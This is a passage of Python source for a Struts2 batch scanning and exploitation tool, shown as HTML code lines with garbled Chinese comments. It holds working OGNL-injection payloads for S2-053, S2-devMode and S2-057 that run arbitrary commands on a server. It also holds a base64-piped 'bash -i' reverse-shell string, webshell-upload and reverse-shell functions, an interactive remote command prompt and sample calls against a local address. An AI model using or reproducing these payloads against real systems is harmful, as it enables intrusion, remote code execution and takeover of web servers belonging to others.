data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-053&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_devMode:</span><br><span class="line">    &quot;&quot;&quot;S2-devModeæ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-devMode:å½±å“ç‰ˆæœ¬Struts 2.1.0-2.3.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    web_path = &quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=Is-Struts2-Vul-URL&amp;pp=%2f&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;</span><br><span class="line">    exec_payload = &quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-devMode&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        html = get_stream(self.url + self.exec_payload.format(cmd=quote(cmd)), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_057:</span><br><span class="line">    &quot;&quot;&quot;S2-057æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-057:å½±å“ç‰ˆæœ¬Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%24%7BNUM1%2BNUM2%7D&quot;</span><br><span class="line">    exec_payload1 = &quot;%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload2 = &quot;%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload3 = &quot;%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload4 = &quot;%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&quot;.action&quot;):</span><br><span class="line">            rindex = url.rindex(&#x27;/&#x27;)</span><br><span class="line">            self.url = url[:rindex + 1]</span><br><span class="line">            self.name = url[rindex + 1:]</span><br><span class="line">        elif url.endswith(&quot;/&quot;):</span><br><span class="line">            self.url = url</span><br><span class="line">            self.name = &quot;index.action&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">            self.name = &quot;index.action&quot;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.replace(&quot;NUM1&quot;, str(num1)).replace(&quot;NUM2&quot;, str(num2))</span><br><span class="line">        url = self.url + poc + &quot;/&quot; + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if str(num1 + num2) in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-057&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def choice_exp(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ç”¨çš„exp&quot;&quot;&quot;</span><br><span class="line">        payloads = [self.exec_payload1, self.exec_payload2, self.exec_payload3, self.exec_payload4]</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        for exp in payloads:</span><br><span class="line">            payload = exp.format(cmd=quote(&quot;echo &quot; + hash_str))</span><br><span class="line">            url = self.url + payload + &quot;/&quot; + self.name</span><br><span class="line">            html = get_302(url, self.headers, self.encoding)</span><br><span class="line">            if hash_str in html:</span><br><span class="line">                return exp</span><br><span class="line">        return &quot;ERROR: æ— å¯ç”¨Payload!&quot;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        exp = self.choice_exp()</span><br><span class="line">        if exp.startswith(&#x27;ERROR:&#x27;):</span><br><span class="line">            return exp</span><br><span class="line"> </span><br><span class="line">        payload = exp.format(cmd=quote(cmd))</span><br><span class="line">        url = self.url + payload + &quot;/&quot; + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># æ‰€æœ‰æ¼æ´åç§°</span><br><span class="line">s2_dict = &#123;&#x27;S2_001&#x27;: S2_001, &#x27;S2_003&#x27;: S2_003, &#x27;S2_005&#x27;: S2_005, &#x27;S2_007&#x27;: S2_007, &#x27;S2_008&#x27;: S2_008, &#x27;S2_009&#x27;: S2_009,</span><br><span class="line">           &#x27;S2_012&#x27;: S2_012, &#x27;S2_013&#x27;: S2_013, &#x27;S2_015&#x27;: S2_015, &#x27;S2_016&#x27;: S2_016, &#x27;S2_019&#x27;: S2_019, &#x27;S2_029&#x27;: S2_029,</span><br><span class="line">           &#x27;S2_032&#x27;: S2_032, &#x27;S2_033&#x27;: S2_033, &#x27;S2_037&#x27;: S2_037, &#x27;S2_045&#x27;: S2_045, &#x27;S2_046&#x27;: S2_046, &#x27;S2_048&#x27;: S2_048,</span><br><span class="line">           &#x27;S2_052&#x27;: S2_052, &#x27;S2_053&#x27;: S2_053, &#x27;S2_devMode&#x27;: S2_devMode, &quot;S2_057&quot;: S2_057&#125;</span><br><span class="line"># S2-052ä¸æ”¯æŒæ¼æ´æ‰«æå’Œæ£€æŸ¥</span><br><span class="line">s2_list1 = [S2_001, S2_003, S2_005, S2_007, S2_008, S2_009, S2_012, S2_013, S2_015, S2_016, S2_019,</span><br><span class="line">           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode, S2_057]</span><br><span class="line">s2_list = [&#x27;S2_001&#x27;, &#x27;S2_003&#x27;, &#x27;S2_005&#x27;, &#x27;S2_007&#x27;, &#x27;S2_008&#x27;, &#x27;S2_009&#x27;, &#x27;S2_012&#x27;, &#x27;S2_013&#x27;, &#x27;S2_015&#x27;, &#x27;S2_016&#x27;, &#x27;S2_019&#x27;,</span><br><span class="line">           &#x27;S2_029&#x27;, &#x27;S2_032&#x27;, &#x27;S2_033&#x27;, &#x27;S2_037&#x27;, &#x27;S2_045&#x27;, &#x27;S2_046&#x27;, &#x27;S2_048&#x27;, &#x27;S2_053&#x27;, &#x27;S2_devMode&#x27;, &#x27;S2_057&#x27;]</span><br><span class="line"> </span><br><span class="line"># æ”¯æŒè·å–WEBè·¯å¾„çš„æ¼æ´åç§°åˆ—è¡¨</span><br><span class="line">webpath_names = [&quot;S2_001&quot;, &quot;S2_005&quot;, &quot;S2_013&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_032&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_devMode&quot;]</span><br><span class="line"># æ”¯æŒå‘½ä»¤æ‰§è¡Œçš„æ¼æ´åç§°åˆ—è¡¨</span><br><span class="line">exec_names = [&quot;S2_001&quot;, &quot;S2_003&quot;, &quot;S2_005&quot;, &quot;S2_007&quot;, &quot;S2_008&quot;, &quot;S2_009&quot;, &quot;S2_013&quot;, &quot;S2_015&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;,</span><br><span class="line">              &quot;S2_029&quot;, &quot;S2_032&quot;, &quot;S2_033&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_048&quot;, &quot;S2_052&quot;, &quot;S2_053&quot;, &quot;S2_devMode&quot;,</span><br><span class="line">              &quot;S2_057&quot;]</span><br><span class="line"># æ”¯æŒåå¼¹shellçš„æ¼æ´åç§°åˆ—è¡¨</span><br><span class="line">reverse_names = [&quot;S2_001&quot;, &quot;S2_007&quot;, &quot;S2_008&quot;, &quot;S2_009&quot;, &quot;S2_013&quot;, &quot;S2_015&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_029&quot;, &quot;S2_032&quot;,</span><br><span class="line">                 &quot;S2_033&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_048&quot;, &quot;S2_052&quot;, &quot;S2_053&quot;, &quot;S2_devMode&quot;, &quot;S2_057&quot;]</span><br><span class="line"># æ”¯æŒæ–‡ä»¶ä¸Šä¼ çš„æ¼æ´åç§°åˆ—è¡¨</span><br><span class="line">upload_names = [&quot;S2_013&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;]</span><br><span class="line"> </span><br><span class="line">banner = &quot;&quot;&quot;</span><br><span class="line"> ____  _              _       ____    ____                  </span><br><span class="line">/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  </span><br><span class="line">\___ \| __| &#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;_ \ </span><br><span class="line"> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |</span><br><span class="line">|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|</span><br><span class="line"> </span><br><span class="line">                                      Author By HatBoy        </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def show_info():</span><br><span class="line">    &quot;&quot;&quot;æ¼æ´è¯¦æƒ…ä»‹ç»&quot;&quot;&quot;</span><br><span class="line">    click.secho(&quot;[+] æ”¯æŒå¦‚ä¸‹Struts2æ¼æ´:&quot;, fg=&#x27;red&#x27;)</span><br><span class="line">    for k, v in s2_dict.items():</span><br><span class="line">        click.secho(v.info, fg=&#x27;green&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_one(s):</span><br><span class="line">    &quot;&quot;&quot;æ£€æµ‹å•ä¸ªæ¼æ´&quot;&quot;&quot;</span><br><span class="line">    result = s.check()</span><br><span class="line">    return result</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def scan_one(url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">    &quot;&quot;&quot;æ‰«æå•ä¸ªURLæ¼æ´&quot;&quot;&quot;</span><br><span class="line">    click.secho(&#x27;[+] æ­£åœ¨æ‰«æURL:&#x27; + url, fg=&#x27;green&#x27;)</span><br><span class="line">    ss = [s(url, data, headers, encoding) for s in s2_list1]</span><br><span class="line">    with futures.ThreadPoolExecutor(max_workers=10) as executor:</span><br><span class="line">        results = list(executor.map(check_one, ss))</span><br><span class="line">    results = &#123;r for r in results if r&#125;</span><br><span class="line">    click.secho(&#x27;[*] ----------------results------------------&#x27;.format(url=url), fg=&#x27;green&#x27;)</span><br><span class="line">    if (not results) and (not is_quiet):</span><br><span class="line">        click.secho(&#x27;[*] &#123;url&#125; æœªå‘ç°æ¼æ´&#x27;.format(url=url), fg=&#x27;red&#x27;)</span><br><span class="line">    for r in results:</span><br><span class="line">        if r.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            click.secho(&#x27;[ERROR] &#123;url&#125; è®¿é—®å‡ºé”™: &#123;error&#125;&#x27;.format(url=url, error=r[6:]), fg=&#x27;red&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            click.secho(&#x27;[*] &#123;url&#125; å­˜åœ¨æ¼æ´: &#123;name&#125;&#x27;.format(url=url, name=r), fg=&#x27;red&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def scan_more(urls, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">    &quot;&quot;&quot;æ‰¹é‡æ‰«æURL&quot;&quot;&quot;</span><br><span class="line">    scan = partial(scan_one, data=data, headers=headers, encoding=encoding)</span><br><span class="line">    with futures.ProcessPoolExecutor(max_workers=process) as executor:</span><br><span class="line">        results = list(executor.map(scan, urls))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">CONTEXT_SETTINGS = dict(help_option_names=[&#x27;-h&#x27;, &#x27;--help&#x27;])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">@click.command(context_settings=CONTEXT_SETTINGS)</span><br><span class="line">@click.option(&#x27;-i&#x27;, &#x27;--info&#x27;, is_flag=True, help=&quot;æ¼æ´ä¿¡æ¯ä»‹ç»&quot;)</span><br><span class="line">@click.option(&#x27;-v&#x27;, &#x27;--version&#x27;, is_flag=True, help=&quot;æ˜¾ç¤ºå·¥å…·ç‰ˆæœ¬&quot;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, help=&quot;URLåœ°å€&quot;)</span><br><span class="line">@click.option(&#x27;-n&#x27;, &#x27;--name&#x27;, help=&quot;æŒ‡å®šæ¼æ´åç§°, æ¼æ´åç§°è¯¦è§info&quot;)</span><br><span class="line">@click.option(&#x27;-f&#x27;, &#x27;--file&#x27;, help=&quot;æ‰¹é‡æ‰«æURLæ–‡ä»¶, ä¸€è¡Œä¸€ä¸ªURL&quot;)</span><br><span class="line">@click.option(&#x27;-d&#x27;, &#x27;--data&#x27;, help=&quot;POSTå‚æ•°, éœ€è¦ä½¿ç”¨çš„payloadä½¿ç”¨&#123;exp&#125;å¡«å……, å¦‚: name=test&amp;passwd=&#123;exp&#125;&quot;)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--encode&#x27;, default=&quot;UTF-8&quot;, help=&quot;é¡µé¢ç¼–ç , é»˜è®¤UTF-8ç¼–ç &quot;)</span><br><span class="line">@click.option(&#x27;-p&#x27;, &#x27;--proxy&#x27;, help=&quot;HTTPä»£ç†. æ ¼å¼ä¸ºhttp://ip:port&quot;)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--timeout&#x27;, help=&quot;HTTPè¶…æ—¶æ—¶é—´, é»˜è®¤10s&quot;)</span><br><span class="line">@click.option(&#x27;-w&#x27;, &#x27;--workers&#x27;, help=&quot;æ‰¹é‡æ‰«æè¿›ç¨‹æ•°, é»˜è®¤ä¸º10ä¸ªè¿›ç¨‹&quot;)</span><br><span class="line">@click.option(&#x27;--header&#x27;, help=&quot;HTTPè¯·æ±‚å¤´, æ ¼å¼ä¸º: key1=value1&amp;key2=value2&quot;)</span><br><span class="line">@click.option(&#x27;-e&#x27;, &#x27;--exec&#x27;, is_flag=True, help=&quot;è¿›å…¥å‘½ä»¤æ‰§è¡Œshell&quot;)</span><br><span class="line">@click.option(&#x27;--webpath&#x27;, is_flag=True, help=&quot;è·å–WEBè·¯å¾„&quot;)</span><br><span class="line">@click.option(&#x27;-r&#x27;, &#x27;--reverse&#x27;, help=&quot;åå¼¹shellåœ°å€, æ ¼å¼ä¸ºip:port&quot;)</span><br><span class="line">@click.option(&#x27;--upfile&#x27;, help=&quot;éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„å’Œåç§°&quot;)</span><br><span class="line">@click.option(&#x27;--uppath&#x27;, help=&quot;ä¸Šä¼ çš„ç›®å½•å’Œåç§°, å¦‚: /usr/local/tomcat/webapps/ROOT/shell.jsp&quot;)</span><br><span class="line">@click.option(&#x27;-q&#x27;, &#x27;--quiet&#x27;, is_flag=True, help=&quot;å…³é—­æ‰“å°ä¸å­˜åœ¨æ¼æ´çš„è¾“å‡ºï¼Œåªä¿ç•™å­˜åœ¨æ¼æ´çš„è¾“å‡º&quot;)</span><br><span class="line">def main(info, version, url, file, name, data, header, encode, proxy, exec, reverse, upfile, uppath, quiet, timeout,</span><br><span class="line">         workers, webpath):</span><br><span class="line">    &quot;&quot;&quot;Struts2æ‰¹é‡æ‰«æåˆ©ç”¨å·¥å…·&quot;&quot;&quot;</span><br><span class="line">    global proxies, is_quiet, _tiemout, process</span><br><span class="line">    click.secho(banner, fg=&#x27;red&#x27;)</span><br><span class="line">    if not encode:</span><br><span class="line">        encode = &#x27;UTF-8&#x27;</span><br><span class="line">    if info:</span><br><span class="line">        show_info()</span><br><span class="line">        exit(0)</span><br><span class="line">    if version:</span><br><span class="line">        click.secho(&quot;[+] Struts2 Scan V0.1&quot;, fg=&#x27;green&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line">    if proxy:</span><br><span class="line">        proxies = &#123;</span><br><span class="line">            &quot;http&quot;: proxy,</span><br><span class="line">            &quot;https&quot;: proxy</span><br><span class="line">        &#125;</span><br><span class="line">    if quiet:</span><br><span class="line">        is_quiet = True</span><br><span class="line">    if timeout and check_int(&#x27;timeout&#x27;, timeout):</span><br><span class="line">        _tiemout = check_int(&#x27;timeout&#x27;, timeout)</span><br><span class="line">    if workers and check_int(&#x27;workers&#x27;, workers):</span><br><span class="line">        process = check_int(&#x27;workers&#x27;, workers)</span><br><span class="line">    if url and not name:</span><br><span class="line">        scan_one(url, data, header, encode)</span><br><span class="line">    if file:</span><br><span class="line">        urls = read_urls(file)</span><br><span class="line">        scan_more(urls, data, header, encode)</span><br><span class="line">    if name and url:</span><br><span class="line">        # æŒ‡å®šæ¼æ´åˆ©ç”¨</span><br><span class="line">        name = name.upper().replace(&#x27;-&#x27;, &#x27;_&#x27;)</span><br><span class="line">        if name not in s2_list:</span><br><span class="line">            click.secho(&quot;[ERROR] æš‚ä¸æ”¯æŒ&#123;name&#125;æ¼æ´åˆ©ç”¨&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">            exit(0)</span><br><span class="line">        s = s2_dict[name](url, data, header, encode)</span><br><span class="line">        s.check()</span><br><span class="line">        if not s.is_vul:</span><br><span class="line">            click.secho(&quot;[ERROR] è¯¥URLä¸å­˜åœ¨&#123;name&#125;æ¼æ´&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">        if webpath:</span><br><span class="line">            if name in webpath_names:</span><br><span class="line">                web_path = s.get_path()</span><br><span class="line">                click.secho(&quot;[*] &#123;webpath&#125;&quot;.format(webpath=web_path), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] æ¼æ´&#123;name&#125;ä¸æ”¯æŒè·å–WEBè·¯å¾„&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if reverse:</span><br><span class="line">            if name in reverse_names:</span><br><span class="line">                click.secho(&quot;[*] è¯·åœ¨åå¼¹åœ°å€å¤„ç›‘å¬ç«¯å£å¦‚: nc -lvvp 8080&quot;, fg=&quot;red&quot;)</span><br><span class="line">                if &#x27;:&#x27; not in reverse:</span><br><span class="line">                    click.secho(&quot;[ERROR] reverseåå¼¹åœ°å€æ ¼å¼ä¸å¯¹,æ­£ç¡®æ ¼å¼ä¸º: 192.168.1.10:8080&quot;, fg=&quot;red&quot;)</span><br><span class="line">                ip = reverse.split(&#x27;:&#x27;)[0].strip()</span><br><span class="line">                port = reverse.split(&#x27;:&#x27;)[1].strip()</span><br><span class="line">                s.reverse_shell(ip, port)</span><br><span class="line">                exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] æ¼æ´&#123;name&#125;ä¸æ”¯æŒåå¼¹shell&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if upfile and uppath:</span><br><span class="line">            if name in upload_names and check_file(upfile):</span><br><span class="line">                result = s.upload_shell(uppath, upfile)</span><br><span class="line">                if result is True:</span><br><span class="line">                    click.secho(&quot;[+] æ–‡ä»¶ä¸Šä¼ æˆåŠŸ!&quot;, fg=&quot;green&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                elif str(result).startswith(&quot;ERROR:&quot;):</span><br><span class="line">                    click.secho(&quot;[ERROR] æ–‡ä»¶ä¸Šä¼ å¤±è´¥! &#123;error&#125;&quot;.format(error=result[6:]), fg=&quot;red&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                else:</span><br><span class="line">                    click.secho(&quot;[ERROR] æ–‡ä»¶ä¸Šä¼ å¤±è´¥! \n&#123;error&#125;&quot;.format(error=result), fg=&quot;red&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] æ¼æ´&#123;name&#125;ä¸æ”¯æŒæ–‡ä»¶ä¸Šä¼ &quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if exec:</span><br><span class="line">            if name in exec_names:</span><br><span class="line">                if name == &quot;S2_052&quot;:</span><br><span class="line">                    click.secho(&quot;[+] æç¤º: S2_052å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ï¼Œå¯å°†ç»“æœå†™å…¥æ–‡ä»¶è®¿é—®&quot;, fg=&#x27;red&#x27;)</span><br><span class="line">                while True:</span><br><span class="line">                    cmd = input(&#x27;&gt;&gt;&gt;&#x27;)</span><br><span class="line">                    result = s.exec_cmd(cmd)</span><br><span class="line">                    click.secho(result, fg=&#x27;red&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] æ¼æ´&#123;name&#125;ä¸æ”¯æŒå‘½ä»¤æ‰§è¡Œ&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        click.secho(s.info, fg=&#x27;green&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        main()</span><br><span class="line">    except KeyboardInterrupt as e:</span><br><span class="line">        exit(0)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        click.secho(&quot;[ERROR] &#123;error&#125;&quot;.format(error=e), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"># s = S2_001(&quot;http://192.168.100.8:8080/login.action&quot;)</span><br><span class="line"># print(s.info)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s =  S2_003(&quot;http://192.168.100.8:8080/showcase.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_005(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = 